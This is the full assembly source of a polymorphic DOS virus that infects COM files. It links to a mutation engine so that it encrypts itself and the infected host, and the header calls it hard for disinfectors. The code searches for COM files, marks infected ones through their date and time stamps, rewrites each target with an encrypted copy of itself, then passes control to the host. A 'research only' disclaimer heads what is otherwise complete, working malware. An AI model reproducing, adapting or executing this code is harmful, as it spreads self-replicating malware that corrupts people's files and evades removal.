;A small mutation-engine based COM infector which encrypts both the
;virus and the COM file. A real bear for disinfectors.

;This Virus for research purposes only. Please do not release!
;Please execute it only on a carefully controlled system, and only
;if you know what you're doing!

                .model  tiny            ;Tiny model to create a COM file

                .code

                extrn   crypt:near      ;mutation engine function
                extrn   host:near       ;host program
                extrn   rnd_init:near;  ;for the engine

;DTA definitions
DTA             EQU     0000H           ;Disk transfer area
FSIZE           EQU     DTA+1AH         ;file size location in file search
FNAME           EQU     DTA+1EH         ;file name location in file search

                ORG     100H

;******************************************************************************
;The virus starts here.

VIRSTART:
                call    GETLOC
GETLOC:         pop     si
                sub     si,3                            ;heres where virus starts
                push    si
                mov     ax,ds
                add     ax,1000H
                mov     es,ax                           ;upper segment is this one + 1000H
                mov     di,100H                         ;move virus there at offset 100H
                mov     cx,OFFSET HOST - 100H
                rep     movsb                           ;this will louse the infection up if run under debug!
                mov     ds,ax                           ;set ds to high segment
                push    ds
                mov     ax,OFFSET FIND_FILE
                push    ax
                retf                                    ;jump to high memory segment

;Now it's time to find a viable file to infect. We will look for any COM file
;and see if the virus is there already.
FIND_FILE:
                pop     si
                mov     [HOSTOFS],si                    ;need this in high memory
                xor     dx,dx                           ;move dta to high segment
                mov     ah,1AH                          ;so we don't trash the command line
                int     21H                             ;which the host is expecting
                mov     dx,OFFSET COMFILE
                mov     ch,3FH                          ;search for any file, no matter what attribute (note: cx=0 before this instr)
                mov     ah,4EH                          ;DOS search first function
                int     21H
CHECK_FILE:     jnc     NXT1
                jmp     ALLDONE                         ;no COM files to infect
NXT1:           mov     dx,FNAME                        ;first open the file
                mov     ax,3D02H                        ;r/w access open file, since we'll want to write to it
                int     21H
                jc      NEXT_FILE
                mov     bx,ax                           ;put file handle in bx, and leave it there for the duration
                mov     ax,5700H                        ;get file attribute
                int     21H
                mov     ax,cx
                xor     ax,dx                           ;date xor time mod 10 = 3 for infected file
                xor     dx,dx
                mov     cx,10
                div     cx
                cmp     dx,3
                jnz     INFECT_FILE                     ;not 3, go infect

NEXT_FILE:      mov     ah,4FH                          ;look for another file
                int     21H
                jmp     SHORT CHECK_FILE                ;and go check it out

COMFILE         DB      '*.COM',0
HOSTOFS         DW      0

;When we get here, we've opened a file successfully, and read it into memory.
;In the high segment, the file is set up exactly as it will look when infected.
;Thus, to infect, we just rewrite the file from the start, using the image
;in the high segment.
INFECT_FILE:
                push    bx                              ;save file handle

                mov     dx,OFFSET HOST                  ;end of virus
                mov     di,FSIZE                        ;if read in first, this gets trashed by the engine
                mov     cx,cs:[di]                      ;get file size for reading into buffer
                push    cx
                mov     ah,3FH                          ;DOS read function
                int     21H                             ;read host in

                call    rnd_init
                pop     cx
                add     cx,OFFSET HOST - 100H           ;size of code to encrypt
                mov     dx,100H                         ;ds:dx --> code to encrypt
                mov     bp,dx                           ;offset where execution begins
                mov     di,0
                mov     si,0
                mov     ax,ds                           ;set up work seg for mte
                add     ax,1000H
                mov     es,ax
                mov     bl,1                            ;small model
                mov     ax,80H
                call    crypt
                pop     bx

                push    dx
                push    cx

                xor     cx,cx
                mov     dx,cx                           ;reset file pointer to start of file
                mov     ax,4200H
                int     21H
                pop     cx
                pop     dx
;                mov     di,FSIZE
;                add     cx,cs:[di]                      ;add host size to size to write

                mov     ah,40H
                int     21H                             ;write virus+host to file

                push    cs
                pop     ds                              ;ds=cs

                mov     ax,5700H                        ;get date & time on file
                int     21H
                push    dx
                mov     ax,cx                           ;fix it
                xor     ax,dx
                mov     cx,10
                xor     dx,dx
                div     cx
                mul     cx
                add     ax,3
                pop     dx
                xor     ax,dx
                mov     cx,ax
                mov     ax,5701H                        ;and save it
                int     21H

EXIT_ERR:
                mov     ah,3EH                          ;close the file
                int     21H

;The infection process is now complete. This routine moves the host program
;down so that its code starts at offset 100H, and then transfers control to it.
ALLDONE:
                mov     bx,[HOSTOFS]            ;relative offset of program
                sub     bx,100H                 ;bx=size of decrypt routine
                mov     ax,ss                   ;set ds, es to low segment again
                mov     ds,ax
                mov     es,ax
                push    ax                      ;prep for retf to host
                mov     dx,80H                  ;restore dta to original value
                mov     ah,1AH                  ;for compatibility
                int     21H
                mov     di,100H                 ;prep to move host back to original location
                mov     si,OFFSET HOST
                add     si,bx
                push    di
                mov     cx,sp                   ;move code, but don't trash the stack
                sub     cx,si
                rep     movsb                   ;move code
                retf                            ;and return to host

                END     VIRSTART
